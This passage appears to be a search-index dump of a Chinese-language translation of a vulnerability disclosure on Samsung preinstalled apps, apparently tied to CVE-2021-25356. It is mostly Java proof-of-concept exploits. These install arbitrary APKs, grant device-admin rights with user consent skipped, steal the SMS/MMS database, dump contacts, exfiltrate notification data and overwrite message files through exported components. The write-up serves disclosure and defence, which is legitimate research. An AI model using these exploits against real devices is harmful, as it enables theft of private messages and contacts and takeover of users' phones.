notifyMPError(5); } } else { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD native crypto\"); startRunnerTask(intent); } } }","title":"Knox Core \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_5","text":"protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); try { Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(copyFile()).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); startService(i); } catch (Throwable th) { throw new RuntimeException(th); } } private File copyFile() throws Throwable { File file = new File(getApplicationInfo().dataDir, \"app.apk\"); InputStream i = getAssets().open(\"app-release.apk\"); OutputStream o = new FileOutputStream(file); IOUtils.copy(i, o); i.close(); o.close(); return file; }","title":"\u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u7684\u6982\u5ff5\u8bc1\u660e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#smsmms","text":"protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); startDump(); try { File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(dbPath).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); new Thread(() -> { for(int j = 1; j < 1000; j++) { startService(i); try { Thread.sleep(500); } catch (Throwable th) { throw new RuntimeException(th); } } }).start(); } catch (Throwable th) { throw new RuntimeException(th); } } private void startDump() { final String path = \"/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk\"; ContentValues values = new ContentValues(); values.put(\"_data\", path); Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri(\"external\"), values); new Thread(new Runnable() { public void run() { while (true) { try { InputStream i = getContentResolver().openInputStream(uri); String data = IOUtils.toString(i); Log.d(\"evil\", data); i.close(); } catch (Throwable th) { } } } }).start(); }","title":"SMS/MMS \u6587\u4ef6\u76d7\u7a83\u7684\u6982\u5ff5\u8bc1\u660e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#poc","text":"\u542f\u52a8\u670d\u52a1\u5c06\u6240\u9700\u6587\u4ef6\u590d\u5236\u5230\u516c\u5171\u4f4d\u7f6e\uff08\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a\u65e0\u6548\u7684APK\u6587\u4ef6\uff0c\u5b89\u88c5\u9519\u8bef\u540e\u4f1a\u7acb\u5373\u5220\u9664\uff09\uff0c \u7136\u540e\uff0c client_downloaded_knox_app.apk \u8bfb\u53d6\u6587\u4ef6\u3002 \u6ce8\u610f\uff1a \u6211\u4eec\u4f7f\u7528 MediaStore.Files \u662f\u56e0\u4e3a\u6700\u65b0\u7684 Android \u7248\u672c\u4e0d\u5141\u8bb8\u76f4\u63a5\u8bfb\u53d6\u5c5e\u4e8e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u5916\u90e8\u5b58\u50a8\uff0c\u4f46\u8fd9\u53ef\u4ee5\u4f7f\u7528 Android Media Content Provider \u7ed5\u8fc7\u3002","title":"PoC \u7684\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\uff1a"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_6","text":"Managed Provisioning \u662f\u6240\u6709\u4e09\u661f\u8bbe\u5907\u4e0a\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c \u7528\u4e8e\u4f01\u4e1a\u8bbe\u5907\u5b9a\u5236 \u3002 \u518d\u4e00\u6b21\uff0c\u5728\u6d4b\u8bd5 Managed Provisioning \u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4ece\u516c\u5171\u76ee\u5f55\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff1a \u6700\u521d\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u7531 AOSP \u5f00\u53d1\u7684\uff0c\u5b83\u6709\u5b89\u5168\u68c0\u67e5\u6765\u9a8c\u8bc1\u4efb\u4f55\u4ea4\u4e92\u7684\u6388\u6743\u3002\u4e09\u661f\u4fee\u6539\u4e86\u6258\u7ba1\u914d\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u6dfb\u52a0\u4e0e\u5176\u751f\u6001\u7cfb\u7edf\u548c Knox Core \u4ea4\u4e92\u6240\u9700\u7684\u529f\u80fd\u3002 \u56e0\u6b64\uff0c\u5728\u4e09\u661f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u503c\u6765\u7ed5\u8fc7\u6b64\u68c0\u67e5 com.samsung.knox.container.requestId \uff1a int intExtra = intent.getIntExtra(\"com.samsung.knox.container.requestId\", -1); if (intExtra > 0) { ProvisionLogger.logw(\"Skipping verifyActionAndCaller\"); // the bypass } else if (!verifyActionAndCaller(intent, str)) { return; }","title":"\u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u6f0f\u6d1e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_7","text":"\u8fd9\u4e2a\u6982\u5ff5\u8bc1\u660e\u662f\u901a\u8fc7\u590d\u5236 ProvisioningParams.Builder \u7c7b\u7684\u4ee3\u7801\u5e76\u4f20\u9012\u914d\u7f6e\u6258\u7ba1\u4f9b\u5e94\u6240\u9700\u7684\u6807\u51c6\u53c2\u6570\u6765\u6784\u5efa\u7684\uff0c\u5176\u4e2d\u5305\u62ec\uff1a \u4e0b\u8f7d\u5e94\u7528\u7a0b\u5e8f\u7684 URL \u6587\u4ef6\u7684 SHA1 \u54c8\u5e0c\u503c \u5728 \u8bbe\u5907\u7ba1\u7406\u63a5\u6536\u673a \u7ec4\u4ef6\u540d\u79f0 byte[] hash = Base64.decode(\"5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ\", 0); PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder() .setLocation(\"https://redacted.s3.amazonaws.com/app-release.apk\") .setPackageChecksum(hash) .setSignatureChecksum(hash); ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder() .setSkipUserConsent(true) .setDeviceAdminComponentName(new ComponentName(\"test.exampleapp\", \"test.exampleapp.MyReceiver\")) .setDeviceAdminPackageName(\"test.exampleapp\") .setProvisioningAction(\"android.app.action.PROVISION_MANAGED_DEVICE\") .setDeviceAdminDownloadInfo(infoBuiler.build()); ProvisioningParams params = builder.build(); Intent i = new Intent(\"com.android.managedprovisioning.action.RESUME_PROVISIONING\"); i.setClassName(\"com.android.managedprovisioning\", \"com.android.managedprovisioning.preprovisioning.PreProvisioningActivity\"); i.putExtra(\"provisioningParams\", params); i.putExtra(\"com.samsung.knox.container.requestId\", 1); i.putExtra(\"com.samsung.knox.container.configType\", \"knox-do-basic\"); startActivity(i); \u6253\u5f00\u5e94\u7528\u7a0b\u5e8f\u540e\uff0c\u53d1\u751f\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff1a Managed Provisioning \u88ab\u8feb\u4ece\u653b\u51fb\u8005\u6307\u5b9a\u7684\u94fe\u63a5\u4e0b\u8f7d\u6076\u610f\u5e94\u7528\u7a0b\u5e8f \u6b65\u9aa4 1 \u4e2d\u5b89\u88c5\u7684\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\u88ab\u8bbe\u7f6e\u4e3a\u5177\u6709\u4efb\u610f\u6743\u9650\u7684\u8bbe\u5907\u7ba1\u7406\u5458 \u542f\u52a8\u4e86\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u8be5\u8fc7\u7a0b\u5c06\u5220\u9664\u5b89\u88c5\u5728\u540c\u4e00\u8bbe\u5907\u4e0a\u7684\u6240\u6709\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u653b\u51fb\u770b\u8d77\u6765\u662f\u8fd9\u6837\u7684\uff1a","title":"\u7528\u4e8e\u5b89\u88c5\u81ea\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e3a\u5176\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u6982\u5ff5\u8bc1\u660e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_8","text":"\u5b89\u5168\u6587\u4ef6\u5939\u662f\u9884\u88c5\u5728\u4e09\u661f\u8bbe\u5907\u4e0a\u7684\u5b89\u5168\u6587\u4ef6\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u62e5\u6709\u5927\u91cf\u6743\u9650\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u5728\u8bbf\u95ee \u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u7a0b\u5e8f\u4e2d \u53d1\u73b0\u7684\u6f0f\u6d1e\u6765\u62e6\u622a\u8fd9\u4e9b\u6743\u9650\uff1a \u4e00\u65e6\u653b\u51fb\u8005\u6536\u5230\u4ed6\u4eec\u53d1\u9001\u7684\u610f\u56fe\uff0c\u4ed6\u4eec\u5c31\u80fd\u591f\u62e6\u622a\u6743\u9650\u3002 \u4f5c\u4e3a PoC\uff0c\u6211\u4eec\u62e6\u622a\u4e86\u8bfb/\u5199\u8054\u7cfb\u4eba\u7684\u6743\u9650\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent i = new Intent(); i.setClassName(\"com.samsung.knox.securefolder\", \"com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity\"); i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); i.setData(ContactsContract.RawContacts.CONTENT_URI); startActivityForResult(i, 0); } protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); dump(data.getData()); } private void dump(Uri uri) { Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i < cursor.getColumnCount(); i++) { if (sb.length() > 0) { sb.append(\", \"); } sb.append(cursor.getColumnName(i) + \" = \" + cursor.getString(i)); } Log.d(\"evil\", sb.toString()); } while (cursor.moveToNext()); } }","title":"\u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u6f0f\u6d1e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#secsettings","text":"SecSettings \u662f\u4e09\u661f\u9884\u88c5\u7684\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\u3002 \u4ece UID 1000 ( system )\u8bfb\u53d6\u548c\u5199\u5165\u4efb\u610f\u6587\u4ef6\u7684\u6f0f\u6d1e\u7531\u4e24\u4e2a\u7ec4\u4ef6\u7ec4\u6210\uff1a \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005 \u5728 com.sec.imsservice \u5e94\u7528\u7a0b\u5e8f\u4e2d\u5229\u7528\u4e0d\u5b89\u5168\u7684 FileProvider \u8fd9\u4e2a\u94fe\u662f\u552f\u4e00\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f7f\u7528\u5728\u5b83\u4eec\u7684 AndroidManifest.xml : \u4e2d\u6307\u5b9a\u7684\u76f8\u540c\u5171\u4eab UID android:sharedUserId=\"android.uid.system\" \u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e2a\u8bbe\u7f6e\u610f\u5473\u7740\u4e24\u4e2a\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5b8c\u5168\u5171\u4eab\u6240\u6709\u8d44\u6e90\uff0c\u5e76\u4e14\u53ef\u4ee5\u5b8c\u5168\u8bbf\u95ee\u5f7c\u6b64\u7684\u7ec4\u4ef6\u3002SecSettings \u4e2d\u7684\u6f0f\u6d1e\u662f Google \u7684\u3002\u5b83\u5df2\u62a5\u544a\u7ed9 Android VDP\u3002\u5956\u91d1\u4e3a2000\u7f8e\u5143\u3002\u6211\u4eec\u5c06\u5728\u7b2c 2 \u90e8\u5206\u6587\u7ae0\u4e2d\u62ab\u9732\u6b64\u95ee\u9898\u7684\u8be6\u7ec6\u4fe1\u606f\u3002","title":"SecSettings \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#dex-ui","text":"\u6b64\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005 \u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e \uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u5305\u62ec Telegram\u3001Google Docs \u6587\u4ef6\u5939\u3001\u4e09\u661f\u7535\u5b50\u90ae\u4ef6\u548c Gmail \u6536\u4ef6\u7bb1\u7684\u804a\u5929\u63cf\u8ff0\uff0c\u4ee5\u53ca\u6765\u81ea\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u901a\u77e5\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u6fc0\u6d3b\u8be5\u529f\u80fd\u5728 SD \u5361\u4e0a\u7684\u5168\u5c40\u53ef\u8bfb\u76ee\u5f55\u4e2d\u521b\u5efa\u5907\u4efd\uff1a \u7531\u4e8e\u6587\u4ef6\u5728\u521b\u5efa\u5907\u4efd\u540e\u7acb\u5373\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6211\u4eec\u6dfb\u52a0\u4e86\u521b\u5efa\u5907\u4efd\u526f\u672c\u7684\u529f\u80fd\u4ee5\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a final File root = Environment.getExternalStorageDirectory(); final File policyFile = new File(root, \"notification_policy.xml\"); final File backupCopy = new File(root, \"backup\"); Intent i = new Intent(\"com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION\"); i.setClassName(\"com.samsung.desktopsystemui\", \"com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver\"); i.putExtra(\"SAVE_PATH\", root.getAbsolutePath()); i.putExtra(\"SESSION_KEY\", \"not_empty\"); sendBroadcast(i); new Thread(() -> { while (true) { if(policyFile.exists()) { try { InputStream i = new FileInputStream(policyFile); OutputStream o = new FileOutputStream(backupCopy); IOUtils.copy(i, o); i.close(); o.close(); } catch (Throwable th) { throw new RuntimeException(th); } } } }).start();","title":"\u4e09\u661f DeX \u7cfb\u7edf UI \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#telephonyui","text":"\u63a5\u6536\u5668 com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver \u88ab\u5bfc\u51fa\u3002\u5b83\u5c06\u6587\u4ef6\u4ece \u4e2d\u6307\u5b9a\u7684 URL \u4fdd\u5b58\u5230 \u4e2d\u6307\u5b9a photoring_uri \u7684\u8def\u5f84 down_file \u3002\u8fd9\u662f\u7531\u8fc7\u5ea6\u5b89\u5168\u7684 Android \u626b\u63cf\u4eea\u68c0\u6d4b\u5230\u7684\uff1a \u552f\u4e00\u7684\u8981\u6c42\u662f\u670d\u52a1\u5668\u54cd\u5e94\u7684\u5185\u5bb9\u7c7b\u578b\u5e94\u8be5\u662f image/* or video/* \u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4f7f\u7528\u6587\u4ef6\u540d test.mp4 \uff0cAmazon S3 \u81ea\u52a8\u6307\u5b9a video/mp4 \u54cd\u5e94\u4e2d\u7684\u5185\u5bb9\u7c7b\u578b\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Intent i = new Intent(\"com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING\"); i.setClassName(\"com.samsung.android.app.telephonyui\", \"com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver\"); i.putExtra(\"photoring_uri\", \"https://redacted.s3.amazonaws.com/test.mp4\"); i.putExtra(\"down_file\", dbPath.getAbsolutePath()); sendBroadcast(i); \u7ed3\u679c\uff0c\u5e26\u6709 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\u88ab\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5bb9\u8986\u76d6\u3002","title":"TelephonyUI \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#phototable","text":"\u5728 PhotoTable \u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86 Intent redirection \uff0c\u5b83\u5141\u8bb8\u5bf9\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u88ab\u62e6\u622a\uff1a \u6211\u4eec\u5229\u7528\u8be5\u6f0f\u6d1e\u52ab\u6301\u4e86\u8bbf\u95ee SD \u5361\u7684\u6743\u9650\u3002\u8fd9\u662f\u6982\u5ff5\u8bc1\u660e\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); handle(getIntent()); } protected void onNewIntent(Intent intent) { super.onNewIntent(intent); handle(intent); } private void handle(Intent intent) { if(\"evil\".equals(intent.getAction())) { String uri = MediaStore.Images.Media.insertImage(getContentResolver(), Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888), \"Title_1337\", \"Description_1337\"); Log.d(\"evil\", \"Result: \" + uri); } else { Intent next = new Intent(\"evil\", MediaStore.Images.Media.EXTERNAL_CONTENT_URI); next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION); next.setClass(this, getClass()); Intent i = new Intent(); i.setClassName(\"com.android.dreams.phototable\", \"com.android.dreams.phototable.PermissionsRequestActivity\"); i.putExtra(\"previous_intent\", next); i.putExtra(\"permission_list\", new String[0]); startActivity(i); } } from \u539f\u6587\u94fe\u63a5\uff1a https://www.ddosi.org/cve-2021-25356/","title":"PhotoTable \u4e2d\u7684\u6f0f\u6d1e"}]}